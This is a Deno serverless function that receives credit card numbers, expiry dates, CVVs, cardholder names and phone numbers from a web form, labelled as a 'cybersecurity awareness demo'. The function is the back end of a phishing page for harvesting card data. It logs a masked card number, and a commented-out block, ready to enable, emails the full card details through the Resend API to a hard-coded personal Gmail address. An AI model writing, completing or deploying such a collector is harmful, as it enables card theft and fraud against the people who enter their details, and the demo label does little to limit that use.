import { serve } from "https://deno.land/std@0.168.0/http/server.ts"

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
}

serve(async (req) => {
  // Handle CORS preflight requests
  if (req.method === 'OPTIONS') {
    return new Response('ok', { headers: corsHeaders })
  }

  try {
    const { cardNumber, expiryDate, cvv, cardholderName, phoneNumber, timestamp } = await req.json()

    // Email content for cybersecurity awareness demo
    const emailContent = `
CYBERSECURITY AWARENESS DEMO - Card Information Captured

⚠️ WARNING: This is a demonstration of how sensitive information can be intercepted ⚠️

Captured Credit Card Information:
- Phone Number: ${phoneNumber}
- Card Number: ${cardNumber}
- Expiry Date: ${expiryDate}
- CVV: ${cvv}
- Cardholder Name: ${cardholderName}
- Timestamp: ${timestamp}

This demonstrates how phishing sites can capture and send sensitive information.
In a real attack, this data would be used for fraud.

Always verify the legitimacy of websites before entering sensitive information.
    `

    // Send email using a service like Resend, SendGrid, etc.
    // For demo purposes, we'll just log it
    console.log('Card info captured for cybersecurity demo:', {
      phoneNumber,
      cardNumber: cardNumber.slice(0, 4) + '****',
      timestamp
    })

    // In a real implementation, you would send this to mckaymort1@gmail.com
    // Example with Resend:
    /*
    const response = await fetch('https://api.resend.com/emails', {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${Deno.env.get('RESEND_API_KEY')}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        from: 'cybersec-demo@yourdomain.com',
        to: 'mckaymort1@gmail.com',
        subject: 'Cybersecurity Demo - Card Info Captured',
        text: emailContent
      })
    })
    */

    return new Response(
      JSON.stringify({ success: true, message: 'Card info processed for demo' }),
      { 
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        status: 200 
      }
    )
  } catch (error) {
    return new Response(
      JSON.stringify({ error: error.message }),
      { 
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        status: 500 
      }
    )
  }
})